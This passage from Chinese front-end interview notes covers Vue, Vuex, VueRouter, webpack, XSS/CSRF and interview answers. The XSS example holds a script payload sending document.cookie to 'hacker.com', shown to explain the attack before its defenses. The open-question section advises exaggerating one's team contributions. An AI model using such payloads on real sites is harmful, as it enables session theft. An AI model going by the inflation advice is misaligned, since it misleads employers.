<li><p>功能上：computed是计算属性，也就是依赖其它的属性计算所得出最后的值。watch是去监听一个值的变化，然后执行相对应的函数(翻译解释，computed依赖属性然后计算属性，watch监听变化执行函数)</p>
</li>
<li><p>使用上：computed中的函数必须要用return返回；watch的回调里面会传入监听属性的新旧值，通过这两个值可以做一些特定的操作，不是必须要用return（computed一定有return返回，而watch传入新旧值，可以没有return）</p>
</li>
<li><p>性能上：computed中的函数所依赖的属性没有发生变化，那么调用当前的函数的时候会从缓存中读取，而watch在每次监听的值发生变化的时候都会执行回调（computed有缓存数据变化才会调用函数。watch没有缓存，每次变化都会调用）</p>
</li>
<li><p>场景上：computed：当一个属性受多个属性影响的时候，例子：购物车商品结算；watch：当一条数据影响多条数据的时候，例子：搜索框（computed<strong>单个</strong>受到多个影响，watch是<strong>单个</strong>影响多个。）<br>简单记忆——<strong>（返回）迎（影响）芳（缓存）姐（解释）</strong><br><a href="https://zhuanlan.zhihu.com/p/33778594" target="_blank" rel="noopener">知乎上也有区别参考</a></p>
</li>
</ul>
</li>
<li><p><strong>必考</strong>：Vue 有哪些生命周期钩子函数？分别有什么用？<br>钩子在<a href="https://cn.vuejs.org/v2/guide/instance.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE%E7%A4%BA" target="_blank" rel="noopener">文档</a>全都有，看红色的字。 </p>
<ul>
<li>beforeCreate——在实例初始化之后调用并做响应的事情。</li>
<li>created——在实例创建完成后被立即调用</li>
<li>beforeMount——在挂载开始之前被调用</li>
<li>mounted——实例被挂载后调用</li>
<li>beforeUpdate——<strong>数据更新</strong>时调用，发生在<strong>虚拟 DOM 打补丁之前</strong></li>
<li>updated——由于<strong>数据更改</strong>导致的<strong>虚拟 DOM 重新渲染和打补丁</strong>，在这之后会调用该钩子</li>
<li>activated——被 keep-alive <strong>缓存的组件激活</strong>时调用</li>
<li>deactivated——被 keep-alive <strong>缓存的组件停用</strong>时调用。</li>
<li>beforeDestroy——实例销毁之前调用</li>
<li>destroyed——实例销毁后调用</li>
<li>errorCaptured——当<strong>捕获</strong>一个来自<strong>子孙组件的错误时</strong>被调用</li>
<li><strong>分类记忆</strong>——五组两两相似就有八个了，每（<strong>m</strong>ounted开头字母）次（<strong>c</strong>reated开头字母）都（<strong>u</strong>pdated）有(<strong>u</strong>pdated)大(da——<strong>d</strong>eactivated <strong>a</strong>ctivated )<ul>
<li>beforeMount mounted（每mei）</li>
<li>beforeCreate created （次ci）</li>
<li>beforeDestroy destroyed(都dou)</li>
<li>beforeUpdate updated(有u)</li>
<li>deactivated activated （大da）</li>
<li>最后一个是errorCaptured<br>把名字翻译一遍就是满分<br>要特别说明哪个钩子里<strong>请求数据，<a href="https://segmentfault.com/q/1010000010643393" target="_blank" rel="noopener">答案是 mounted</a></strong>  </li>
</ul>
</li>
</ul>
</li>
<li><p><strong>必考</strong>：Vue 如何实现组件间通信？<br>父子组件：使用 v-on 通过事件通信(触发用$emit(‘事件名’,数据),监听用<a href="https://cn.vuejs.org/v2/api/#vm-on" target="_blank" rel="noopener">$on(‘事件名’，function(){}</a>)<br>爷孙组件：使用两次 v-on 通过爷爷爸爸通信，爸爸儿子通信实现爷孙通信<br>任意组件：使用 eventBus = new Vue() 来创建<a href="https://cn.vuejs.org/v2/guide/migration.html#dispatch-%E5%92%8C-broadcast-%E6%9B%BF%E6%8D%A2" target="_blank" rel="noopener">事件中心</a>通信，然后就可以在不同的组件中使用这eventBus.$on 和 eventBus.$emit这个两个主要API,<a href="https://github.com/bomber063/DIY-UI-frame-by-Vue-for-all/tree/tabs" target="_blank" rel="noopener">关于eventBus我之前写过笔记</a><br>任意组件：使用 Vuex 通信  </p>
</li>
<li><p><strong>必考</strong>：Vue 数据响应式怎么做到的？（或者这个问题以前会问Vue双向绑定的原理是什么，实际上应该是响应式原理。原理也就是源代码）<br>答案在文档<a href="https://cn.vuejs.org/v2/guide/reactivity.html" target="_blank" rel="noopener">《深入响应式原理》</a><br>要点<br>使用 Object.defineProperty（可以记住<strong>打(da)屁(pi)的</strong>拼音的第一个字母） 把这些属性全部转为 getter/setter<br>注意事项Vue <strong>不能检测到对象属性的添加或删除</strong>，解决方法是手动调用 Vue.set 或者 this.$set</p>
<blockquote>
<p>更详细的说明就是<a href="https://zhuanlan.zhihu.com/p/101330697" target="_blank" rel="noopener">参考这里</a>,一句话就是——vue.js 采用数据劫持结合发布-订阅模式,通过 Object.defineproperty 来劫持各个属性转为 setter,getter,在数据变动时发布消息给订阅者,触发响应的监听回调</p>
</blockquote>
<ul>
<li>另外以前这个题目也叫做Vue的双向绑定是怎么做到的，但是Vue不是双向绑定，所以就不这么问了<ul>
<li>回答Vue是如何实现双向绑定的就说用v-model，这里由<strong>两个语法实现(:input和:value)</strong>，可以查看以前的<a href="https://github.com/bomber063/DIY-UI-frame-by-Vue-for-all/tree/button-and-input" target="_blank" rel="noopener">笔记</a>,<strong>简单记忆就是ie,tv</strong>。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>必考</strong>：Vue.set 是做什么用的？<br>见上一题——Vue <strong>不能检测到对象属性的添加或删除</strong>，解决方法是手动调用 Vue.set 或者 this.$set</p>
</li>
<li><p>Vuex 你怎么用的？<br>背下文档第一句：<a href="https://vuex.vuejs.org/zh/" target="_blank" rel="noopener">Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式</a><br>说出核心概念的名字和作用：<a href="https://vuex.vuejs.org/zh/guide/state.html" target="_blank" rel="noopener">State</a> /<a href="https://vuex.vuejs.org/zh/guide/getters.html" target="_blank" rel="noopener">Getter</a> /<a href="https://vuex.vuejs.org/zh/guide/mutations.html" target="_blank" rel="noopener">Mutation</a> /<a href="https://vuex.vuejs.org/zh/guide/actions.html" target="_blank" rel="noopener">Action</a> /<a href="https://vuex.vuejs.org/zh/guide/modules.html" target="_blank" rel="noopener">Module</a>, Module有点复杂也可以<strong>不用详细回答</strong><br><a href="https://www.jianshu.com/p/bc63633321be" target="_blank" rel="noopener">Vuex 通俗版教程告诉你Vuex怎么用</a></p>
<ul>
<li>5个核心：<ul>
<li>state——就是根据你项目的需求，自己定义的一个数据结构，里面可以放些通用的状态。</li>
<li>getter——怎么理解呢？通俗的理解可以认为是getter里的函数就是vuex里的计算属性，类似于computed函数。</li>
<li>mutations——改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutations 非常类似于事件</li>
<li>Action类似于mutations，但是它<strong>提交的是 mutation，而不是直接变更状态</strong></li>
<li>Modules——Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块</li>
<li>总结起来：<strong>mutation</strong> 只管<strong>存</strong>，你给我（dispatch）我就存；<strong>action</strong>只管<strong>中间处理</strong>，处理完我就给你，你怎么存我不管（所有的改变state状态的都是mutation 来操作）；<strong>Getter</strong> 我只管<strong>取</strong>，我不改的（类似计算属性）。<br>简单记忆——gamma，<strong>第一个g代表getter,a代表action，m代表mutations和modules，最后一个state不需要记忆。</strong></li>
</ul>
</li>
</ul>
</li>
<li><p>VueRouter 你怎么用的？</p>
<ol>
<li>背下文档第一句：<a href="https://router.vuejs.org/zh/" target="_blank" rel="noopener">Vue Router</a> 是 Vue.js 官方的路由管理器。</li>
<li>说出核心概念的名字和作用：<a href="https://router.vuejs.org/zh/guide/essentials/history-mode.html" target="_blank" rel="noopener">History 模式</a> /<a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html" target="_blank" rel="noopener">导航守卫</a> /<a href="https://router.vuejs.org/zh/guide/advanced/lazy-loading.html" target="_blank" rel="noopener">路由懒加载</a> /<a href="https://router.vuejs.org/zh/guide/essentials/redirect-and-alias.html" target="_blank" rel="noopener">重定向和别名</a>  </li>
</ol>
<ul>
<li>路由懒加载说道import后面括号加上组件路径即可,比如<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">'./Foo.vue'</span>) <span class="comment">// 返回 Promise</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>说出常用 API：<a href="https://router.vuejs.org/zh/api/#router-link" target="_blank" rel="noopener">router-link</a> /<a href="https://router.vuejs.org/zh/api/#router-view" target="_blank" rel="noopener">router-view</a> /<a href="https://router.vuejs.org/zh/guide/essentials/navigation.html" target="_blank" rel="noopener">this.$router.push</a> /<a href="https://router.vuejs.org/zh/guide/essentials/navigation.html" target="_blank" rel="noopener">this.$router.replace</a> /<a href="https://router.vuejs.org/zh/guide/essentials/dynamic-matching.html" target="_blank" rel="noopener">this.$route.params</a> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$router.push(<span class="string">'/user-admin'</span>)</span><br><span class="line"><span class="keyword">this</span>.$route.params</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><a href="https://www.jianshu.com/p/9e39f877379c" target="_blank" rel="noopener">Vue-router中hash模式和history模式的区别</a></li>
<li><a href="https://juejin.im/post/5b82bcfcf265da4345153343" target="_blank" rel="noopener">可能比文档还详细–VueRouter完全指北</a></li>
<li><a href="https://segmentfault.com/a/1190000012563794" target="_blank" rel="noopener">VueRouter进阶（1）-导航守卫</a></li>
</ul>
</li>
<li><p>路由守卫是什么？<br> 见上一节<a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html" target="_blank" rel="noopener">导航守卫</a>里面的<a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html#%E8%B7%AF%E7%94%B1%E7%8B%AC%E4%BA%AB%E7%9A%84%E5%AE%88%E5%8D%AB" target="_blank" rel="noopener">路由守卫</a><br>看官方文档的例子，背里面的关键的话</p>
<h2 id="TypeScript（考的不多）"><a href="#TypeScript（考的不多）" class="headerlink" title="TypeScript（考的不多）"></a>TypeScript（考的不多）</h2></li>
<li><p>never 类型是什么？<br>不应该出现的类型</p>
</li>
<li><p>TypeScript 比起 JavaScript 有什么优点？<br> <a href="https://www.zhihu.com/question/308564378" target="_blank" rel="noopener">随着 JavaScript 越来越完善，还有必要学习 TypeScript 吗？</a><br>提供了类型约束，因此更可控、更容易重构、更适合大型项目、更容易维护</p>
<h2 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h2></li>
<li><p><strong>必考</strong>：有哪些常见 loader 和 plugin，你用过哪些？<br><a href="https://segmentfault.com/a/1190000005106383" target="_blank" rel="noopener">webpack 常用plugin和loader</a><br> 按照类型：</p>
<ul>
<li><p>loader</p>
<ul>
<li>html有pug-loader(这个我不知道是什么语言),Markdown-loader</li>
<li>css有post-loader,scss-loader,less-loader,style-loader</li>
<li>js有baber-loader,eslint-loader</li>
<li><strong>图片有image-loader</strong></li>
</ul>
</li>
<li><p>plugin</p>
<ul>
<li>html有html-webpack-plugin</li>
<li>css有<strong>extract-text-plugin</strong></li>
<li>js有<strong>plugin-transform-arrow-functions</strong>，见以前的<a href="https://github.com/bomber063/first-acquaintance-webpack-for-46" target="_blank" rel="noopener">笔记</a></li>
<li>其他有<strong>IgnorePlugin——不打包匹配文件</strong></li>
</ul>
</li>
<li><p>按照总的类型：  </p>
<ul>
<li>file-loader：把文件输出到一个文件夹中，在代码中通过相对 URL 去引用输出的文件</li>
<li>url-loader：和 file-loader 类似，但是能在文件很小的情况下以 base64 的方式把文件内容注入到代码中去</li>
<li>source-map-loader：加载额外的 Source Map 文件，以方便断点调试</li>
<li><strong>下面几个比较容易记住</strong><ul>
<li><strong>image-loader：加载并且压缩图片文件</strong></li>
<li>babel-loader：把 ES6 转换成 ES5</li>
<li>css-loader：加载 CSS，支持模块化、压缩、文件导入等特性</li>
<li>style-loader：把 CSS 代码注入到 JavaScript 中，通过 DOM 操作去加载 CSS。</li>
<li>eslint-loader：通过 ESLint 检查 JavaScript 代码<ul>
<li>plugin</li>
<li><strong>define-plugin：定义环境变量</strong></li>
<li>commons-chunk-plugin：提取公共代码</li>
<li>uglifyjs-webpack-plugin：通过UglifyES压缩ES6代码</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>常用 Loaders</p>
<ul>
<li>本节将对本书用到的及其它常用 Loader 做一个汇总，以方便你在这快速查找到你需要的 Loader。</li>
</ul>
</li>
<li><p>加载文件</p>
<ul>
<li>raw-loader：把文本文件的内容加载到代码中去，在 3-20加载SVG 中有介绍。</li>
<li>file-loader：把文件输出到一个文件夹中，在代码中通过相对 URL 去引用输出的文件，在 3-19加载图片、3-20加载 SVG、4-9 CDN 加速 中有介绍。</li>
<li>url-loader：和 file-loader 类似，但是能在文件很小的情况下以 base64 的方式把文件内容注入到代码中去，在 3-19加载图片、3-20加载 SVG 中有介绍。</li>
<li>source-map-loader：加载额外的 Source Map 文件，以方便断点调试，在 3-21加载 Source Map 中有介绍。</li>
<li>svg-inline-loader：把压缩后的 SVG 内容注入到代码中，在 3-20加载 SVG 中有介绍。</li>
<li><strong>node-loader：加载 Node.js 原生模块 .node 文件。</strong></li>
<li><strong>image-loader：加载并且压缩图片文件。</strong></li>
<li>json-loader：加载 JSON 文件。</li>
<li>yaml-loader：加载 YAML 文件。</li>
</ul>
</li>
<li><p>编译模版</p>
<ul>
<li>pug-loader：把 Pug 模版转换成 JavaScript 函数返回。</li>
<li>handlebars-loader：把 Handlebars 模版编译成函数返回。</li>
<li>ejs-loader：把 EJS 模版编译成函数返回。</li>
<li>haml-loader：把 HAML 代码转换成 HTML。</li>
<li><strong>markdown-loader：把 Markdown 文件转换成 HTML。</strong></li>
</ul>
</li>
<li><p>转换脚本语言</p>
<ul>
<li><strong>babel-loader：把 ES6 转换成 ES5，在3-1使用 ES6 语言中有介绍。</strong></li>
<li>ts-loader：把 TypeScript 转换成 JavaScript，在3-2使用 TypeScript 语言中有遇到。</li>
<li>awesome-typescript-loader：把 TypeScript 转换成 JavaScript，性能要比 ts-loader 好。</li>
<li>coffee-loader：把 CoffeeScript 转换成 JavaScript。</li>
</ul>
</li>
<li><p>转换样式文件</p>
<ul>
<li><strong>css-loader：加载 CSS，支持模块化、压缩、文件导入等特性。</strong></li>
<li><strong>style-loader：把 CSS 代码注入到 JavaScript 中，通过 DOM 操作去加载 CSS。</strong></li>
<li><strong>sass-loader：把 SCSS/SASS 代码转换成 CSS，在3-4使用 SCSS 语言中有介绍。</strong></li>
<li><strong>postcss-loader：扩展 CSS 语法，使用下一代 CSS，在3-5使用 PostCSS中有介绍。</strong>，我有记录<a href="https://github.com/bomber063/first-acquaintance-webpack2-for-46" target="_blank" rel="noopener">postcss-loader笔记</a></li>
<li><strong>less-loader：把 Less 代码转换成 CSS 代码。</strong></li>
<li>stylus-loader：把 Stylus 代码转换成 CSS 代码。</li>
</ul>
</li>
<li><p>检查代码</p>
<ul>
<li>eslint-loader：通过 ESLint 检查 JavaScript 代码，在 3-16检查代码中有介绍。</li>
<li>tslint-loader：通过 TSLint 检查 TypeScript 代码。</li>
<li>mocha-loader：加载 Mocha 测试用例代码。</li>
<li>coverjs-loader：计算测试覆盖率。</li>
</ul>
</li>
<li><p>其它</p>
<ul>
<li>vue-loader：加载 Vue.js 单文件组件，在3-7使用 Vue 框架中有介绍。</li>
<li>i18n-loader：加载多语言版本，支持国际化。</li>
<li>ignore-loader：忽略掉部分文件，在3-11构建同构应用中有介绍。</li>
<li>ui-component-loader：按需加载 UI 组件库，例如在使用 antd UI 组件库时，不会因为只用到了 Button 组件而打包进所有的组件。</li>
</ul>
</li>
<li><p>以上信息来自于<a href="https://webpack.wuhaolin.cn/%E9%99%84%E5%BD%95/%E5%B8%B8%E7%94%A8Loaders.html" target="_blank" rel="noopener">这里</a></p>
</li>
<li><p>常用 Plugins</p>
<ul>
<li>本节将对本书用到的及其它常用 Plugin 做一个汇总，以方便你在这快速查找到你需要的 Plugin。</li>
</ul>
</li>
<li><p>用于修改行为</p>
<ul>
<li><strong>define-plugin：定义环境变量，在4-7区分环境中有介绍。</strong></li>
<li>context-replacement-plugin：修改 require 语句在寻找文件时的默认行为。</li>
<li>ignore-plugin：用于忽略部分文件。</li>
</ul>
</li>
<li><p>用于优化</p>
<ul>
<li>commons-chunk-plugin：提取公共代码，在4-11提取公共代码中有介绍。</li>
<li><strong>extract-text-webpack-plugin：提取 JavaScript 中的 CSS 代码到单独的文件中，在1-5使用 Plugin 中有介绍。</strong></li>
<li>prepack-webpack-plugin：通过 Facebook 的 Prepack 优化输出的 JavaScript 代码性能，在 4-13使用 Prepack 中有介绍。</li>
<li>uglifyjs-webpack-plugin：通过 UglifyES 压缩 ES6 代码，在 4-8压缩代码中有介绍。</li>
<li>webpack-parallel-uglify-plugin：多进程执行 UglifyJS 代码压缩，提升构建速度。</li>
<li><strong>imagemin-webpack-plugin：压缩图片文件。</strong></li>
<li>webpack-spritesmith：用插件制作雪碧图。</li>
<li>ModuleConcatenationPlugin：开启 Webpack Scope Hoisting 功能，在4-14开启 ScopeHoisting中有介绍。</li>
<li>dll-plugin：借鉴 DDL 的思想大幅度提升构建速度，在4-2使用 DllPlugin中有介绍。</li>
<li>hot-module-replacement-plugin：开启模块热替换功能。</li>
</ul>
</li>
<li><p>其它</p>
<ul>
<li>serviceworker-webpack-plugin：给网页应用增加离线缓存功能，在3-14 构建离线应用中有介绍。</li>
<li>stylelint-webpack-plugin：集成 stylelint 到项目中，在3-16检查代码中有介绍。</li>
<li>i18n-webpack-plugin：给你的网页支持国际化。</li>
<li>provide-plugin：从环境中提供的全局变量中加载模块，而不用导入对应的文件。</li>
<li>web-webpack-plugin：方便的为单页应用输出 HTML，比 html-webpack-plugin 好用。</li>
</ul>
</li>
<li><p>以上信息来自于<a href="https://webpack.wuhaolin.cn/%E9%99%84%E5%BD%95/%E5%B8%B8%E7%94%A8Plugins.html" target="_blank" rel="noopener">这里</a></p>
</li>
</ul>
</li>
<li><p>英语题：loader 和 plugin 的区别是什么？<br><a href="https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/308" target="_blank" rel="noopener">第 148 题： webpack 中 loader 和 plugin 的区别是什么</a></p>
</li>
</ol>
<ul>
<li>Plugin直译为”插件”。<strong>Plugin可以扩展webpack的功能</strong>，通过在构建流程里注入钩子实现,让webpack具有更多的灵活性。<ul>
<li>它丰富了webpack本身，<strong>针对是loader结束后</strong>，webpack打包的整个过程，<strong>它并不直接操作文件</strong>，而是基于事件机制工作，会监听webpack打包过程中的某些节点，执行广泛的任务</li>
</ul>
</li>
<li>Loader直译为”加载器”。<strong>webpack原生是只能解析js文件，如果想将其他文件也打包的话，就会用到loader。 所以Loader的作用是让webpack拥有了加载和解析非JavaScript文件的能力。</strong></li>
</ul>
<ol start="3">
<li><strong>必考</strong>：如何按需加载代码？</li>
</ol>
<ul>
<li>其实就是上面的 路由懒加载。  <ul>
<li>路由懒加载说道import后面括号加上组件路径即可,比如,这里返回的是Promise，可以继续点then  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">'./Foo.vue'</span>) <span class="comment">// 返回 Promise</span></span><br></pre></td></tr></table></figure></li>
<li>可以参考这里<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-12%E6%8C%89%E9%9C%80%E5%8A%A0%E8%BD%BD.html" target="_blank" rel="noopener">4-12 分割代码按需加载</a></li>
<li>详细一点的说明<br>  单页应用的按需加载 现在很多前端项目都是通过单页应用的方式开发的，但是随着业务的不断扩展，会面临一个严峻的问题——首次加载的代码量会越来越多，影响用户的体验。<ul>
<li><strong>通过import()语句来控制加载时机</strong>，webpack内置了对于import(<em>)的解析，会将import(</em>)中引入的模块作为一个新的入口在生成一个chunk。 当代码执行到import(<em>)语句时，会去加载Chunk对应生成的文件。*</em>import()会返回一个Promise对象**，所以为了让浏览器支持，需要事先注入Promise polyfill</li>
</ul>
</li>
</ul>
</li>
</ul>
<ol start="4">
<li><strong>必考</strong>：如何提高构建速度？<ol>
<li>使用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-3%E4%BD%BF%E7%94%A8HappyPack.html" target="_blank" rel="noopener">Happypack</a> 实现多线程加速编译打包</li>
<li>使用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-4%E4%BD%BF%E7%94%A8ParallelUglifyPlugin.html" target="_blank" rel="noopener">webpack-uglify-parallel</a>来提升uglifyPlugin的压缩速度。 原理上webpack-uglify-parallel采用了多核并行压缩来提升压缩速度</li>
<li>利用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-2%E4%BD%BF%E7%94%A8DllPlugin.html" target="_blank" rel="noopener">DllPlugin</a>和DllReferencePlugin预编译资源模块 通过DllPlugin来对那些我们引用但是绝对不会修改的npm包来进行预编译，再通过DllReferencePlugin将预编译的模块加载进来。</li>
<li>多入口情况下，使用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-11%E6%8F%90%E5%8F%96%E5%85%AC%E5%85%B1%E4%BB%A3%E7%A0%81.html" target="_blank" rel="noopener">CommonsChunkPlugin来提取公共代码</a></li>
</ol>
<ul>
<li>简单记忆——h(<strong>Happypack</strong>)p(webpack-uglify-<strong>parallel</strong>)c(<strong>CommonsChunkPlugin</strong>)d(<strong>DllPlugin</strong>)</li>
</ul>
</li>
<li>转义出的文件过大怎么办？（也就是提高性能）<ol>
<li>上面的使用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-11%E6%8F%90%E5%8F%96%E5%85%AC%E5%85%B1%E4%BB%A3%E7%A0%81.html" target="_blank" rel="noopener">CommonsChunkPlugin来提取公共代码</a>就可以处理文件过大的问题。</li>
<li>压缩js,css和图片。</li>
<li>动态加载的方式——懒加载(import()),前面说过。</li>
</ol>
<ul>
<li>上面的是参考了部分的这里的<a href="https://www.cnblogs.com/vvjiang/p/9327903.html" target="_blank" rel="noopener">回答——webpack打包经验——处理打包文件体积过大的问题</a></li>
</ul>
</li>
</ol>
<p>上面五题请看<a href="https://zhuanlan.zhihu.com/p/44438844" target="_blank" rel="noopener">这个不错的参考</a></p>
<h2 id="安全（老师说现在前端考的很少了）"><a href="#安全（老师说现在前端考的很少了）" class="headerlink" title="安全（老师说现在前端考的很少了）"></a>安全（老师说现在前端考的很少了）</h2><ol>
<li><strong>必考</strong>：什么是 XSS？如何预防？<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting" target="_blank" rel="noopener">XSS(Cross-site_scripting)</a>就是跨站脚本攻击</li>
<li>举例  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.innerHTML = userComment  <span class="comment">// userComment 内容是 &lt;script&gt;$.get('http://hacker.com?cookie='+document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="comment">// 恶意就被执行了，这就是 XSS</span></span><br></pre></td></tr></table></figure></li>
<li>预防<ul>
<li>不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行</li>
<li>如果你一样要用 innerHTML，字符过滤,详细见这个<a href="https://www.w3school.com.cn/html/html_entities.asp" target="_blank" rel="noopener">网址——HTML 字符实体</a><ul>
<li>把 &lt; 替换成 &lt;</li>
<li>把 &gt; 替换成 &gt;</li>
<li>把 &amp; 替换成 &amp;</li>
<li>把 ‘ 替换成 &#39;</li>
<li>把 ‘ 替换成 &quot;</li>
<li>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</li>
</ul>
</li>
<li>使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">CSP Content Security Policy</a><br>更多信息请看<a href="https://zhuanlan.zhihu.com/p/22500730" target="_blank" rel="noopener">方方的文章</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>必考</strong>：什么是 CSRF？如何预防？<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF" target="_blank" rel="noopener">CSRF(Cross-Site Request Forgery)跨站请求伪造</a></li>
<li>过程<ul>
<li>用户在 qq.com 登录</li>
<li>用户切换到 hacker.com（恶意网站）</li>
<li>hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。</li>
<li>用户在不知不觉中添加 hacker 为好友。</li>
<li>用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。</li>
</ul>
</li>
<li>避免<ul>
<li>检查 referer，qq.com 可以拒绝来自 hacker.com 的请求</li>
<li>csrf_token 来解决<br>更多信息请看<a href="https://zhuanlan.zhihu.com/p/22521378" target="_blank" rel="noopener">若愚的文章</a><h2 id="开放题目"><a href="#开放题目" class="headerlink" title="开放题目"></a>开放题目</h2></li>
</ul>
</li>
</ul>
</li>
<li><strong>必考</strong>：你遇到最难的问题是怎样的？<ol>
<li>可以用小程序的<a href="https://developers.weixin.qq.com/community/develop/doc/000aa6b1d3cf28f55fc914da656400" target="_blank" rel="noopener">wx.reLaunch(Object object)通过url传参数的问题</a>，只能传query吗？这个传值问题<ul>
<li>最开始我想实现从历史页面的点击翻译信息跳转到翻译页面显示要翻译的信息和翻译后的信息。但是我用onShow这个函数处理只能获取到query，也就是需要翻译的信息，获取不到翻译后的信息，</li>
<li>我先是在百度和Google上搜索了相关问题，找到一些解决方案是说建议传参和传参进行编码和解码 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/decodeURI" target="_blank" rel="noopener">decode</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/encodeURI" target="_blank" rel="noopener">encode</a>，但是还是解决不了。</li>
<li>然后我又去微信开发社区提问，然后经过一段事件后有一个社友告诉我<a href="https://developers.weixin.qq.com/miniprogram/dev/api/route/wx.reLaunch.html" target="_blank" rel="noopener">wx.reLaunch</a>的传参只能传给<a href="https://developers.weixin.qq.com/miniprogram/dev/reference/api/Page.html#onLoad-Object-query" target="_blank" rel="noopener">onLoad</a>，不能传给<a href="https://developers.weixin.qq.com/miniprogram/dev/reference/api/Page.html#onShow" target="_blank" rel="noopener">onShow</a>。然后我又仔细看了下标准文档里面确实是这么说的</li>
<li>我之前一直都是在onShow里面获取参数，所以一直获取不到，后面改到onLoad里面终于能够获取参数了，然后解决了。</li>
<li>最后我把这个代码和笔记公开到github上面</li>
</ul>
</li>
<li>setTimeout和nextTick的问题。<ul>
<li>就是popover这个组件在做的时候，我考虑到点击弹出这个popover，然后再点击弹出别的地方的时候关闭这个popover这个功能。这里用到<a href="https://cn.vuejs.org/v2/guide/conditional.html#v-if" target="_blank" rel="noopener">v-if的true就是现实，false就是关闭</a>，这里需要用异步操作，那么我最开始是使用$nextTick这个异步操作，是起作用的。</li>
<li>但是有一天我更新了Vue,然后这里就不起作用了，但是我不知道是因为更新Vue版本的问题，后面我就改成了setTimeout就又可以完成这个功能了。</li>
<li>后面我就是通过google和segmentfault（思否）找原因，然后找到可能是不同版本的Vue的$nextTick的功能有一些不一样。然后我就版本更改到之前的版本，于是又可以实现功能了。</li>
</ul>
</li>
<li>Chrome重新安装后<a href="https://github.com/bomber063/DIY-UI-frame-by-Vue" target="_blank" rel="noopener">测试报错</a>——这个我觉得可以不用说了，有前面两个就够了。</li>
</ol>
<ul>
<li><strong>要点：一波三折</strong>。参考<a href="https://www.zhihu.com/question/35323603" target="_blank" rel="noopener">知乎回答</a></li>
</ul>
</li>
<li>你在团队的突出贡献是什么？  <ul>
<li>把小事说大。<ol>
<li>没有团队就说所有项目都是一个人开发的</li>
<li>如果有团队或者在小公司，那么就可以说：比如（如果代码不是很厉害的话）<ol>
<li>每周组织前端分享会，帮助其他成员成长。（实际情况可能在公司只分享了两次，第一次可能是leader强制要求大家分享。第二次就是自己主动去做的）</li>
</ol>
</li>
</ol>
</li>
</ul>
</li>
<li>最近在关注什么新技术<br> 一般可以回答前端前辈关注什么就关注什么，比如方应杭，微博的阮一峰，尤雨溪，还有英文的一些前端知识<br>书、博客、推特、知乎，不要说 CSDN、百度。</li>
<li>有没有看什么源码，看了后有什么记忆深刻的地方，有什么收获<br><strong>看过源码说源码</strong>，推荐看 underscore.js 的源码<br><strong>没看过源码就说同事的代码</strong>，代码烂就说哪里烂，代码好就说哪里好<br>收获：<strong>命名规范、设计模式</strong>，命名规范比较简单，命名规范很重要。变量命名对代码可读性很有帮助。 设计模式和造轮子的思想就相对复杂一点。 <h2 id="刁钻题目"><a href="#刁钻题目" class="headerlink" title="刁钻题目"></a>刁钻题目</h2></li>
<li>代码   <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="built_in">parseInt</span>)</span><br></pre></td></tr></table></figure>
答案  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  </span><br><span class="line"><span class="literal">NaN</span>  </span><br><span class="line"><span class="literal">NaN</span></span><br></pre></td></tr></table></figure>
<ul>
<li>解析<ul>
<li>上面的代码可以需要用到两个知识，一个是<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map" target="_blank" rel="noopener">map()函数</a>，另一个是<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/parseInt" target="_blank" rel="noopener">parseInt()函数</a></li>
<li>parseInt是可以<strong>传两个参数</strong>，一个是需要转换的信息，另一个是按照多少进制转换。</li>
<li>map是可以<strong>传一个函数，但是这个函数可以传三个参数</strong>，第一个是数组中正在处理的当前元素，第二是索引，第三个是map方法调用的数组本身。</li>
